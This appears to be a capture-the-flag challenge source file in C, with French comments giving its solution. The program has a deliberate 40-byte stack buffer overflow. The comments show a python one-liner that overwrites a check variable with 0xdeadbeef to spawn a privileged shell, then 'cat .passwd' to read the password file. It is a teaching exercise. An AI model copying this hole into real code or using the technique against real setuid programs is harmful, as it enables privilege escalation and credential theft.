/*

Résolu grace : 

1 :   python -c "print('A'*40 + '\xef\xbe\xad\xde')" > /tmp/louis
2 :   cat /tmp/louis - | ./ch13
                    le - permet de laisser le sheel ouvert, voir http://mywiki.wooledge.org/BashGuide/InputAndOutput?#Here_Strings

3 :   puis cat .passwd dans le sheel ouvert par le programme

*/    

#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
  
int main()
{
  
  int var;
  int check = 0x04030201;
  char buf[40];
  
  fgets(buf,45,stdin);
  
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
  
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
  
  if (check == 0xdeadbeef)
    {
      printf("Yeah dude! You win!\nOpening your shell...\n");
      setreuid(geteuid(), geteuid());
      system("/bin/bash");
      printf("Shell closed! Bye.\n");
    }
    return 0;
}

/*

python -c 'print("A"*40 + "\xef\xbe\xad\xde")' | ./ch13

*/
